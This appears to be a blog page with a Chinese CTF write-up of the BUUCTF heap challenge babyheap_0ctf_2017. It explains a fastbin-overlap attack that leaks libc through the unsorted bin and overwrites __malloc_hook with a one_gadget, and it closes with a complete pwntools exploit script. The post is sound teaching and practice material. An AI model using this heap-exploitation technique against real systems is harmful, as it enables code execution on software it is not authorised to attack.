@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/1337222.jpeg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":"default"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="no pwn,no fun">
+<meta property="og:type" content="website">
+<meta property="og:title" content="every little helps">
+<meta property="og:url" content="https://github.com/zaoganmaqule">
+<meta property="og:site_name" content="DA1SY&#39;s Blog">
+<meta property="og:description" content="no pwn,no fun">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/images/jxl31y.jpg">
+<meta property="article:published_time" content="2024-08-19T08:13:03.000Z">
+<meta property="article:modified_time" content="2024-08-19T08:27:38.941Z">
+<meta property="article:author" content="da1sy">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/images/jxl31y.jpg">
+
+
+<link rel="canonical" href="https://example.com/2024/08/19/buuctf-pwn%E2%80%94%E2%80%94babyheap-0ctf-2017/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://example.com/2024/08/19/buuctf-pwn%E2%80%94%E2%80%94babyheap-0ctf-2017/","path":"2024/08/19/buuctf-pwn——babyheap-0ctf-2017/","title":"[BUUCTF]PWN——babyheap_0ctf_2017"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[BUUCTF]PWN——babyheap_0ctf_2017 | DA1SY's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">DA1SY's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Every little helps.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">10</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">7</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">利用点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%86%E6%9E%90exp"><span class="nav-number">2.</span> <span class="nav-text">分析exp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getshell"><span class="nav-number">3.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="da1sy"
+      src="/images/jxl31y.jpg">
+  <p class="site-author-name" itemprop="name">da1sy</p>
+  <div class="site-description" itemprop="description">no pwn_no fun</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zaoganmaqule" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zaoganmaqule" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:zheh7777@gmail.com" title="E-Mail → mailto:zheh7777@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://github.com/zaoganmaqule" title="https:&#x2F;&#x2F;github.com&#x2F;zaoganmaqule" rel="noopener" target="_blank">My github</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.csdn.net/has_zaoganmaqule?type=blog" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;has_zaoganmaqule?type&#x3D;blog" rel="noopener" target="_blank">My Blog</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2024/08/19/buuctf-pwn%E2%80%94%E2%80%94babyheap-0ctf-2017/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/jxl31y.jpg">
+      <meta itemprop="name" content="da1sy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DA1SY's Blog">
+      <meta itemprop="description" content="no pwn_no fun">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[BUUCTF]PWN——babyheap_0ctf_2017 | DA1SY's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [BUUCTF]PWN——babyheap_0ctf_2017
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-08-19 16:13:03" itemprop="dateCreated datePublished" datetime="2024-08-19T16:13:03+08:00">2024-08-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">做题笔记</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%A7%AF%E7%B4%AF/" itemprop="url" rel="index"><span itemprop="name">积累</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>首先查看保护</p>
+<p><img src="https://s2.loli.net/2024/08/19/spICMFTbBlDW1dE.png" alt="557822afedec40a936b1ccdafd9fe8ce.png"></p>
+<p>全开是吧！！！</p>
+<p>放神的武器ida里面看看</p>
+<p>main函数一眼，菜单题</p>
+<p><img src="https://s2.loli.net/2024/08/19/zpTu1V2djsnq6Ui.png" alt="5230ec33334c28d704b55ebdc232fb8f.png"></p>
+<p>add函数就很正常，调用calloc函数来申请堆块。（calloc函数和malloc函数的区别就是是否进行初始化，虽然calloc初始化看着更安全点，但是性能特别慢，而且在实际环境中好多变量都不需要进行初始化）</p>
+<p><img src="https://s2.loli.net/2024/08/19/SIuNGD4h27bemKA.png" alt="762cd5e36728edefadd54c99357b2654.png"></p>
+<p>edit函数，发现一个问题就是size没有做限制，但有个loophole函数</p>
+<p><img src="/.com//f8639f0301459ad82bf6e50b00023e57.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>好吧，就是正常的读</p>
+<p><img src="https://s2.loli.net/2024/08/19/4hCuPOJGsmLcSDz.png" alt="3bb28a0228f1eca04e80c9cde43bc63c.png"></p>
+<p>delete函数，很标准，没有uaf。</p>
+<p><img src="https://s2.loli.net/2024/08/19/pl5T6OUYswDWXaN.png" alt="53c904a44c237cdaa026a029e3f57ac7.png"></p>
+<p>show函数也很正常</p>
+<p><img src="https://s2.loli.net/2024/08/19/jqMRIOSUw3zohtp.png" alt="b8a45a519af11fb31ed058a0eb74a411.png"></p>
+<p>很正常的输出</p>
+<p><img src="https://s2.loli.net/2024/08/19/IjgY2ibzqMnE5Gm.png" alt="f8639f0301459ad82bf6e50b00023e57.png"></p>
+<h5 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h5><p> 分析完，有那个无线长度编辑。</p>
+<h5 id="分析exp"><a href="#分析exp" class="headerlink" title="分析exp"></a>分析exp</h5><p>申请5个chunk，在free掉chunk_1，chunk_2。在修改chunk_2的fd指针的低两字节的值为0x80，将其修改为chunk_4的地址，在修改chunk_4的size位为0x21。</p>
+<p><img src="https://s2.loli.net/2024/08/19/f1FoqbDwnyOjzh2.png" alt="b523610d56a3295b5c3e05d3baeae585.png"></p>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2024/08/19/UcuCsNIbVmL2HzF.png">50315c790ba99b46f8f72f37490c146a.png</a></p>
+<p>此时查看fastbins，此时fastbins里面有两个chunk，一个是chunk_4,一个是chunk_2</p>
+<p><img src="https://s2.loli.net/2024/08/19/N7l1nW9if3K6jOB.png" alt="3a0c60cbced8ca6c16c91223aae8c598.png"></p>
+<p>在申请回来两个chunk，利用fastbins后进先出。现在chunk_4和chunk_2堆重叠了。</p>
+<p><img src="https://s2.loli.net/2024/08/19/pahQ5JBbmf7LP3D.png" alt="6ecaf84124c019d6ddfe460f36e27025.png"></p>
+<p>在恢复chunk_4的size大小,再申请一小块内存，防止你后面delete chunk_4的时候其与top chunk合并</p>
+<p><img src="https://s2.loli.net/2024/08/19/jW2M8Owax7dTX3f.png" alt="90dae465ef57556d97a7235da0039194.png"></p>
+<p>现在delete chunk_4，其会进入到unsortbins里面，接下来就是套路了。</p>
+<p><img src="https://s2.loli.net/2024/08/19/Nzm9jpiFIac1Buo.png" alt="76100a7ca52f734243be622dc08a5717.png"></p>
+<p>泄露main_arena后面进而得到libc_base的值，后面malloc_hook那里找到一块0x7f的内存，来供我申请chunk。该怎么找呢？可以看我的另一篇文章（刚写完，哈哈哈哈哈）。在这里不赘述了。</p>
+<p><img src="https://s2.loli.net/2024/08/19/DQlNR6c4IY1i72s.png" alt="3f5541b4e72311951ddbcaa4d6da5512.png"></p>
+<p>找申请的chunk位置，fakechunk。最后再利用我们的fastbins的手法，申请回来chunk_4的内存，但不要全部申请完，因为如果我直接申请一个0x80，后面delete的时候它会进入到unsortbins里面，不好利用。</p>
+<p><img src="https://s2.loli.net/2024/08/19/Pb6vSaA4DRFI3Ue.png" alt="0d76a8c8747cc16bc036376e27334a66.png"></p>
+<p>因为chunk_2和chunk_4重叠，所以我可以修改这个free的chunk_4的内容，将其fd指针改成我的fake_chunk的位置</p>
+<p><img src="https://s2.loli.net/2024/08/19/MA2BRl5CKYf4Uzx.png" alt="aabd2aed0077f51a6326151e96d17f0e.png"></p>
+<p>最后就是申请到我们的fake_chunk的内容，进而修改，malloc_hook为one_gadget的值。</p>
+<p>小白肯定好奇为啥，用的是calloc为啥修改malloc，因为调用calloc会使用到malloc。还有疑惑这个</p>
+<p><img src="https://s2.loli.net/2024/08/19/6PwDAZvIQjY9nNf.png" alt="48b63d8595a19fe96d58cc5a19667504.png">怎么得到的呢。你看看上一张图哪个后面-0x1b。你这个offset就是0x1b-0x8。</p>
+<p><img src="https://s2.loli.net/2024/08/19/JQGsTuN52vpLUAw.png" alt="ba05438be2f3f04a8ca83c1c24c406bc.png"></p>
+<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p><img src="https://s2.loli.net/2024/08/19/s5lZ42Ee86zDbjS.png" alt="754c9bf197db17ed97a24555cca3b767.png"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    
+    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/da1sy/environment/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"</span><span class="token punctuation">)</span>
+    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so")</span>
+    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.23.so")</span>
+    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.27-3ubuntu1.5_i386/libc-2.23.so")</span>
+
+    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment"># io.recvuntil("\n")</span>
+        <span class="token comment"># io.sendline(name)</span>
+        <span class="token comment"># io.recvuntil("\n")</span>
+        <span class="token comment"># io.sendline(content)</span>
+
+    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Command:"</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content:'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+        
+
+    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1</span>
+    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#3</span>
+    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#4</span>
+    
+    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+    padding <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> padding<span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>
+
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>padding<span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1 这个把原来chunk_2申请回来了</span>
+    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2 这个chunk其实和4号重叠了</span>
+
+    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># 恢复chunk_4的size大小</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment"># 5防止其与topchunk合并的</span>
+    
+    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#chunk被放到了unsortbins里面</span>
+
+    show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+    unsortbins_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'unsortbins_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>unsortbins_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+
+    main_arena <span class="token operator">=</span> unsortbins_addr <span class="token operator">-</span> <span class="token number">0x58</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'main_arena = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+
+    malloc_hook <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x10</span>
+    libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+
+    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'fake_chunk = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#4 申请不可以大于0x80，防止你后面chunk4进入到unsortbins里面</span>
+    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment"># 这一步申请回来主要是为了让chunk4进入到fastbins里面</span>
+    
+    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#5 将上一步申请的chunk给得到</span>
+    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#6 得到我们的fake chunk</span>
+
+    payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'one_gadget = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
+
+    gdb<span class="token punctuation">(</span><span class="token punctuation">)</span>
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   
+
